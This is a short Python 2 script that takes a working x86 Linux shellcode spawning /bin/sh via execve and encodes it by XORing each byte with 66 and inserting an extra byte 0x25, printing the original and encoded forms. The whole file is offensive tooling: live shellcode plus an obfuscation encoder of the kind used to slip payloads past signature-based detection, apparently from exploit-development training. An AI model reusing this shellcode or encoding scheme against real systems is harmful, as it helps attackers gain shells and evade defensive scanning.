#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
decoded = ""

print "Encoding via XOR 66 + inserting new byte \\x25"

for y in bytearray(shellcode):
        decoded+= '0x'+'%02x' %y+','

for x in bytearray(shellcode):
        encoded+='0x'
        x=x^66
        encoded+='%02x,'%x
        encoded+='0x%02x,'%0x25

print "Decoded Shellcode:"
print decoded
print "Encoded Shellcode:"
print encoded
